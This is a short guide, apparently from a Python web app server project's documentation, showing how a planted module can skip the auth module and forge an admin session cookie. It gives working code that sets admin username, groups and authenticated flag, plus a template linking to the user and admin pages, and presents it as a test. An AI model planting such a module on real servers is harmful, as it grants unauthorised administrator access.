# Web App Server

## Hack the server

The security of server is maintained by encripted cookies and encripted client-server connection.

Once the **auth** module accept the user+password combination, a cookie is set and user is authenticated.

Inside the cookie there are user info used to validate application access.

If we bypass the **auth** module (using a crafted **auth**) and populate 
cookie with admin info, we become admins.

Create **``__``init``__``.py** :

```python
#
# An web server module
# used to hack the server
#

from appmodule import AppModule

app = AppModule()

def update_app(module_name, server_config):
    app.update(module_name, server_config)

@app.route("/")
@app.view("index.tpl")
def _():
    bs = app.get_beaker_session()
    bs["username"] = "hackadmin"
    bs["userfullname"] = "Hacker Admin"
    #the userid may be any id
    bs["userid"] = 1000
    #Hacker Admin groups: All users, Anonymous and Admins
    bs["groups"] = [-1,0,1]
    bs["authenticated"] = True
    return dict(title = "Hacker Admin")

```

Create **index.tpl** inside of **view** folder:

```html
% include("header.tpl")

<h1>{{title}}</h1>
You are admin now.<br>
Go to <a href="/auth/users">Manage users</a>
or to <a href="/auth/groups">Manage groups</a>
or to <a href="/adm">Admin module</a>

% include("footer.tpl")
```

Even if is not needed, create a JSON file named **config.json** in the module folder
(where is **``__``init``__``.py** located) using the 
[Application web config editor](https://github.com/icoman/PropertiesEditor_v1) and template for **Web Config Document**.

Don't forget to delete this module after you finish the tests.
